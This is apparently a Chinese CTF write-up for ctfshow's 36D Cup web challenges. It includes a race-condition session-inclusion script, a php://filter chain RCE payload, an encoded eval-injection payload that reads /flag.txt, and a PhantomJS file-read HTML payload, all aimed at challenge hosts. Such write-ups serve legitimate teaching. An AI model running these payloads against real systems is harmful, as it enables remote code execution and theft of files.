<p>这道题的话入口应该是在include函数，但是我试着读flag的时候没读出来，说明应该不是这个名字，用日志注入也没打通，试一下url编码绕过input去rce但是也不行</p>
<p>那就打session文件包含</p>
<p>利用PHP_SESSION_UPLOAD_PROGRESS加条件竞争进行文件包含，直接上脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">sessid=<span class="string">&quot;wanth3f1ag&quot;</span></span><br><span class="line">url=<span class="string">&quot;http://896e6d4e-6df6-4228-8246-19e13efa2866.challenge.ctf.show/flflflflag.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> event.is_set():</span><br><span class="line">        f=io.BytesIO(<span class="string">b&#x27;a&#x27;</span>*<span class="number">1024</span>*<span class="number">50</span>)</span><br><span class="line">        r=session.post(</span><br><span class="line">            url=url,</span><br><span class="line">            cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:sessid&#125;,</span><br><span class="line">            data=&#123;</span><br><span class="line">                <span class="comment"># &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;: &quot;&lt;?php system(&#x27;whoami&#x27;);?&gt;&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            files=&#123;<span class="string">&quot;file&quot;</span>:(<span class="string">&#x27;1.txt&#x27;</span>,f)&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> event.is_set():</span><br><span class="line">        payload=<span class="string">&quot;?file=/tmp/sess_&quot;</span>+sessid</span><br><span class="line">        r=session.get(url=url+payload)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;1.txt&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(r.text)</span><br><span class="line">            event.clear()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    event=threading.Event()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            threading.Thread(target=read,args=(session,)).start()</span><br></pre></td></tr></table></figure>

<p>然后访问我们的木马shell.php并用蚁剑连接</p>
<p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241215003617627.png" alt="image-20241215003617627"></p>
<p>但是是空的，开终端发现显示127</p>
<p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241215003701886.png" alt="image-20241215003701886"></p>
<p>应该是需要绕过disablefunction，直接用蚁剑里面的插件，但是后面发现cat不了那个文件</p>
<p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241215004349936.png" alt="image-20241215004349936"></p>
<p>然后我就利用shell.php去进行rce了</p>
<p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241215004424281.png" alt="image-20241215004424281"></p>
<p>直接对shell.php中的参数1传入phpinfo()，然后在里面找flag就可以了</p>
<p>另外还可以用filter链打RCE，可以参考我另一篇文章<a href="https://wanth3f1ag.top/2025/05/19/filters-chain%E5%AE%9E%E7%8E%B0RCE/">https://wanth3f1ag.top/2025/05/19/filters-chain%E5%AE%9E%E7%8E%B0RCE/</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@VM-16-12-ubuntu:/opt/php_filter_chain_RCE/php_filter_chain_generator# python3 php_filter_chain_generator.py --chain <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span></span><br><span class="line">[+] The following gadget chain will generate the following code : &lt;?php phpinfo();?&gt; (<span class="built_in">base64</span> value: PD9waHAgcGhwaW5mbygpOz8+)</span><br><span class="line">php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp</span><br></pre></td></tr></table></figure>

<p>将生成的内容传入file参数</p>
<p><img src="/../image/achieve/202411/36D%E6%9D%AF+%E7%BB%83%E6%89%8B%E8%B5%9B/image-20250619164207129.png" alt="image-20250619164207129"></p>
<p>成功执行，后面就可以直接读flag了</p>
<p>到此练手赛就结束了，开始进入36D的内容</p>
<h1 id="36D杯"><a href="#36D杯" class="headerlink" title="36D杯"></a>36D杯</h1><h2 id="给你shell"><a href="#给你shell" class="headerlink" title="给你shell"></a>给你shell</h2><p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241215004943533.png" alt="image-20241215004943533"></p>
<p>准备了一个shell给我们，但是扫目录没发现什么内容</p>
<p>源码注释</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--flag is in /flag.txt--&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后访问这个文件发现是空页面，我们抓个包看看</p>
<p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241215005953930.png" alt="image-20241215005953930"></p>
<p>有一个secret的cookie值，拿去解密后是y1ng，但是用蚁剑连接不成功，看来是方向搞错了</p>
<p>后来在页面源码中找到了源代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//It&#x27;s no need to use scanner. Of course if you want, but u will find nothing.</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;view_source&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkCookie</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$arr</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;:&#x27;</span>, <span class="variable">$s</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$arr</span>[<span class="number">0</span>] === <span class="string">&#x27;&#123;&quot;secret&quot;&#x27;</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[\&quot;0-9A-Z]*&#125;$/&#x27;</span>, <span class="variable">$arr</span>[<span class="number">1</span>]) &amp;&amp; <span class="title function_ invoke__">count</span>(<span class="variable">$arr</span>) === <span class="number">2</span> ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="title function_ invoke__">theFirstTimeSetCookie</span>() ) <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;secret&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="title function_ invoke__">time</span>()-<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">haveFun</span>(<span class="params"><span class="variable">$_f_g</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$_g_r</span> = <span class="number">32</span>;</span><br><span class="line">    <span class="variable">$_m_u</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_f_g</span>);</span><br><span class="line">    <span class="variable">$_h_p</span> = <span class="title function_ invoke__">strtoupper</span>(<span class="variable">$_m_u</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$_g_r</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$_i</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_h_p</span>, <span class="variable">$i</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$_i</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$_i</span>);</span><br><span class="line">        <span class="title function_ invoke__">print_r</span>(<span class="variable">$_i</span> &amp; <span class="number">0xC0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;secret&#x27;</span>]) ? <span class="variable">$json</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;secret&#x27;</span>] : <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;secret&#x27;</span>, <span class="string">&#x27;&#123;&quot;secret&quot;:&quot;&#x27;</span> . <span class="title function_ invoke__">strtoupper</span>(<span class="title function_ invoke__">md5</span>(<span class="string">&#x27;y1ng&#x27;</span>)) . <span class="string">&#x27;&quot;&#125;&#x27;</span>, <span class="title function_ invoke__">time</span>()+<span class="number">7200</span> );</span><br><span class="line"><span class="title function_ invoke__">checkCookie</span>(<span class="variable">$json</span>) ? <span class="variable">$obj</span> = @<span class="title function_ invoke__">json_decode</span>(<span class="variable">$json</span>, <span class="literal">true</span>) : <span class="keyword">die</span>(<span class="string">&#x27;no&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$obj</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;give_me_shell&#x27;</span>])) &#123; </span><br><span class="line">    (<span class="variable">$obj</span>[<span class="string">&#x27;secret&#x27;</span>] != <span class="variable">$flag_md5</span> ) ? <span class="title function_ invoke__">haveFun</span>(<span class="variable">$flag</span>) : <span class="keyword">echo</span> <span class="string">&quot;here is your webshell: <span class="subst">$shell_path</span>&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">die</span>;</span><br></pre></td></tr></table></figure>

<p>It’s no need to use scanner. Of course if you want, but u will find nothing.好吧这句话已经在嘲笑我了，怪我没好好审页面源代码吧，那我们来分析一下代码和相关的函数</p>
<h3 id="explode-函数"><a href="#explode-函数" class="headerlink" title="explode()函数"></a>explode()函数</h3><p><code>explode()</code> 函数是 PHP 中用于将字符串分割成数组的一个内置函数</p>
<p>基础语法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span> <span class="title function_ invoke__">explode</span>(<span class="keyword">string</span> <span class="variable">$delimiter</span>, <span class="keyword">string</span> <span class="variable">$string</span>[, <span class="keyword">int</span> <span class="variable">$limit</span> = PHP_INT_MAX])</span><br></pre></td></tr></table></figure>

<p>参数说明</p>
<ol>
<li><strong>$delimiter</strong>:<ul>
<li>字符串类型，指定用于分隔字符串的分隔符。当找到这个分隔符时，<code>explode()</code> 会在该位置将字符串切割开。</li>
</ul>
</li>
<li><strong>$string</strong>:<ul>
<li>字符串类型，要被切割的源字符串。</li>
</ul>
</li>
<li><strong>$limit</strong> (可选):<ul>
<li>整数类型，限制返回的数组元素的数量。如果设置为正数，返回的数组将包含最多 <code>$limit</code> 个元素；如果设置为负数，返回的数组将包含所有元素，但去掉最后 <code>$limit</code> 个元素。</li>
</ul>
</li>
</ol>
<h3 id="strtoupper-函数"><a href="#strtoupper-函数" class="headerlink" title="strtoupper()函数"></a>strtoupper()函数</h3><p><code>strtoupper()</code> 函数是 PHP 中用于将字符串中的所有字母转换为大写字母的一个内置函数。</p>
<p>基础语法</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">string</span> strtoupper(<span class="built_in">string</span> $<span class="built_in">string</span>)</span><br></pre></td></tr></table></figure>

<p>参数说明</p>
<ul>
<li>$string<ul>
<li>字符串类型，输入的要转换为大写的字符串。</li>
</ul>
</li>
</ul>
<p>返回值</p>
<ul>
<li>函数返回转换后的字符串，其中的所有字母都被转换为大写。如果输入字符串中没有字母，或者字符串为空，则返回原字符串。</li>
</ul>
<h3 id="位与运算"><a href="#位与运算" class="headerlink" title="位与运算"></a>位与运算</h3><p>位与运算 (<code>&amp;</code>) 是对两个二进制数逐位比较，如果两个对应的位都是 1，则结果为 1；否则结果为 0。</p>
<p>这里的话随便传入一个secret，就可用拿到flag位运算后的结果，记得这里还需要传入give_me_shell参数，不然就满足不了外层判断句的条件</p>
<p><img src="/../image/achieve/202411/36D%E6%9D%AF+%E7%BB%83%E6%89%8B%E8%B5%9B/image-20250515172421465.png" alt="image-20250515172421465"></p>
<p>得到flag位与运算后的结果是0006464640064064646464006406464064640064006400000000000</p>
<p>首先我们要知道，在经过MD5函数后转大写，只有数字和大写字母</p>
<p>然后我们看看位运算中的结果是什么样的</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$a</span> = <span class="number">1</span>; <span class="variable">$a</span> &lt;= <span class="number">127</span>; <span class="variable">$a</span>++) &#123;</span><br><span class="line">    <span class="variable">$md</span> = <span class="variable">$a</span> &amp; <span class="number">0xC0</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>.<span class="string">&quot;的位运算结果是&quot;</span>.<span class="variable">$md</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以发现，在小于63的时候，运算结果都是0，在大于63小于127的时候运算结果都是64，从flag运算结果来看，前三位都是纯数字，那我们进行爆破</p>
<p>注意:这里的话要把secret设置为纯数字，不然的话就会匹配类型</p>
<p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241217221603876.png" alt="image-20241217221603876"></p>
<p>这里的话我就是没去掉双引号导致并没有绕过这个弱比较，我设置纯数字之后才出来了结果</p>
<p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241217221733638.png" alt="image-20241217221733638"></p>
<p>可以看到文件名，我们访问一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//there are some secret waf that you will never know, fuzz me if you can</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;hidden_filter.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;&lt;script&gt;location.href=\&#x27;./index.php\&#x27;&lt;/script&gt;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="variable">$secret_waf</span>, <span class="variable">$code</span>)) &#123;</span><br><span class="line">        <span class="comment">//清空session 从头再来</span></span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;\$_SESSION[&quot;</span> . <span class="variable">$code</span> . <span class="string">&quot;]=false;&quot;</span>); <span class="comment">//you know, here is your webshell, an eval() without any disabled_function. However, eval() for $_SESSION only XDDD you noob hacker</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>还是一个代码审计，我们简单分析一下，这里需要我们传入一个GET 的code参数和在会话中设置一个login，然后对code进行正则匹配，判断为真则将清空session中code的值，不然的话会输出hacker</p>
<p>这里因为没有给出waf的代码，所以我们需要进行fuzz，而且题目也提示了fuzz，那我们用bp进行fuzz测试一下</p>
<p>通过测试发现过滤了单双引号，括号，反引号，字符 f 以及一些常用函数，加上题目提示我们 flag在 &#x2F;flag.txt中，那个就应该是要读取文件内容了</p>
<p>payload:</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code<span class="operator">=</span>]<span class="operator">=</span><span class="number">1</span>?&gt;&lt;?<span class="operator">=</span>require~<span class="variable">%d0</span><span class="variable">%99</span><span class="variable">%93</span><span class="variable">%9</span>e<span class="variable">%98</span><span class="variable">%d1</span><span class="variable">%8</span>b<span class="variable">%87</span><span class="variable">%8</span>b?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241219084711378.png" alt="image-20241219084711378"></p>
<p>payload：</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code<span class="operator">=</span>]<span class="operator">=</span><span class="number">1</span>?&gt;&lt;?<span class="operator">=</span>require~<span class="variable">%d0</span><span class="variable">%99</span><span class="variable">%93</span><span class="variable">%9</span>e<span class="variable">%98</span>?&gt;</span><br></pre></td></tr></table></figure>

<p>我们解析一下这两个payload，先说第一个，先说第一个</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code<span class="operator">=</span>]<span class="operator">=</span><span class="number">1</span>?&gt;&lt;?<span class="operator">=</span>require~<span class="variable">%d0</span><span class="variable">%99</span><span class="variable">%93</span><span class="variable">%9</span>e<span class="variable">%98</span><span class="variable">%d1</span><span class="variable">%8</span>b<span class="variable">%87</span><span class="variable">%8</span>b?&gt;</span><br></pre></td></tr></table></figure>

<p>其中<code>？&gt;</code>符号可以被当作<code>;</code>解析，而我们这里因为很多符号都被禁用了，我们的思路就是利用<code>eval(&quot;\$_SESSION[&quot; . $code . &quot;]=false;&quot;);</code>，而利用方法就是去闭合这里的<code>eval(&quot;$_SESSION[&quot;</code>去想办法读取flag，因为;在黑名单里但是&lt;&gt;?不在黑名单里，所以我们尝试构造?code&#x3D;]?&gt;&lt;?去进行bypass，然后我又发现我们的()都在黑名单里，所以能读取文件的函数也很少了，但是我发现题目中有<code>require &quot;hidden_filter.php&quot;;</code>的代码，我就想到了用require去进行读取文件</p>
<h2 id="RemoteImageDownloader"><a href="#RemoteImageDownloader" class="headerlink" title="RemoteImageDownloader"></a>RemoteImageDownloader</h2><p>可参考CVE-2019-17221<a target="_blank" rel="noopener" href="https://web.archive.org/web/20191220171022/https://www.darkmatter.ae/blogs/breaching-the-perimeter-phantomjs-arbitrary-file-read/">PhantomJS任意文件读取</a></p>
<p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241219092943000.png" alt="image-20241219092943000"></p>
<p>这个的话是一个从远程加载图片进行下载的题目，这里的话我的思路就是用服务器创建html文件，然后通过download去访问我们的html文件，达到一个攻击的效果</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"> 		<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">			 <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"> 			x=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>;</span></span><br><span class="line"><span class="language-javascript"> 			x.<span class="property">onload</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript"> 			<span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="variable language_">this</span>.<span class="property">responseText</span>)</span></span><br><span class="line"><span class="language-javascript"> 			&#125;;</span></span><br><span class="line"><span class="language-javascript"> 			x.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;file:///flag&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"> 			x.<span class="title function_">send</span>();</span></span><br><span class="line"><span class="language-javascript"> 			</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> 		<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241219093238973.png" alt="image-20241219093238973"></p>
<p>然后我们访问这个1.html，就会进行下载图片，图片中就会带出我们的flag</p>
<p>我们来解释一下那个html文件中的script片段</p>
<ul>
<li><code>new XMLHttpRequest;</code> 创建一个新的 XMLHttpRequest 对象 <code>x</code>。这个对象用于在客户端与服务器之间进行异步请求。</li>
<li><code>x.onload=function()&#123; document.write(this.responseText) &#125;;</code> 定义了当请求完成后要执行的函数。在这个函数中，<code>this.responseText</code> 包含了从服务器返回的响应内容。<code>document.write()</code> 方法会将该内容写入当前文档。</li>
<li><code>x.open(&quot;GET&quot;,&quot;file:///flag&quot;);</code> 准备一个 HTTP GET 请求，目标是一个本地文件（<code>file:///flag</code>）。这是一个文件系统的路径，通常用于尝试从本地读取一个文件。</li>
<li><code>x.send();</code> 发送请求。</li>
</ul>
